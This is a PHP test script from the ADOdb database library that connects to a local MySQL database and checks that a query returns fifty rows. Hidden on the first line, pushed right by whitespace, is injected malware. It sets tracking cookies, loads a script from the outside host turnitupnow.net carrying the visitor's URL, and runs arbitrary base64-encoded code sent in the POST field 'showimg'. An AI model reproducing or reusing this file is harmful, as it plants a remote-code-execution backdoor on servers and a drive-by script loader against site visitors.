<?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }

/* 
V4.80 8 Mar 2006  (c) 2000-2008 John Lim (jlim#natsoft.com). All rights reserved.
  Released under both BSD license and Lesser GPL library license. 
  Whenever there is any discrepancy between the two licenses, 
  the BSD license will take precedence. 
  Set tabs to 4 for best viewing.
	
  Latest version is available at http://adodb.sourceforge.net
*/

error_reporting(E_ALL);

include_once('../adodb-pear.inc.php');
$username = 'root';
$password = '';
$hostname = 'localhost';
$databasename = 'xphplens';
$driver = 'mysql';

$dsn = "$driver://$username:$password@$hostname/$databasename";

$db = DB::Connect($dsn);
$db->setFetchMode(ADODB_FETCH_ASSOC);
$rs = $db->Query('select firstname,lastname from adoxyz');
$cnt = 0;
while ($arr = $rs->FetchRow()) {
	print_r($arr);
	print "<br>";
	$cnt += 1;
}

if ($cnt != 50) print "<b>Error in \$cnt = $cnt</b>";
?>